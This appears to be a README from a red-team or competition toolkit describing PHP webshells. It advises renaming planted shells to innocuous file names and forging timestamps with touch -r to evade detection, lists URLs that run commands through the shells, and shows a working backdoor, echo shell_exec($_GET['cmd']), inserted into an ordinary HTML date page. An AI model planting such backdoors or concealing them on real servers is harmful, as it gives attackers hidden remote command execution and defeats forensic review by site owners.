# Webshell
You should rename each of these webshell's once they have been placed onto a machine some examples are:
a.php
conf.php
include.php
.ignore.php
system.php

Dont forget to change the timestamp on the file touch -r /WEB/SHELL/LOCATION /home/scoring


## guiWebShell.php
A basci gui web shell

## simpleWebShell
http://ip/simpleWebShell.php?cmd=id

## tinyWebShell.php
http://ip/simpleWebShell.php?_=id

## tiny2WebShell.php
http://ip/simpleWebShell.php?0=id

## In line shell
In a existing php file you can add 
`echo shell_exec($_GET['cmd']);`
to add a back door into the file. An example is below
```
<title>How to put PHP in HTML- Date Example</title>

</head>

<body>

<div>This is pure HTML message.</div>

<div>Next, we’ll display today’s date and day by PHP!</div>

<div>

<?php

echo 'Today’s date is <b>' . date('Y/m/d') . '</b> and it’s a <b>'.date('l').'</b> today!';
echo shell_exec($_GET['cmd']);
?>

</div>

<div>Again, this is static HTML content.</div>

</body>

</html>
```

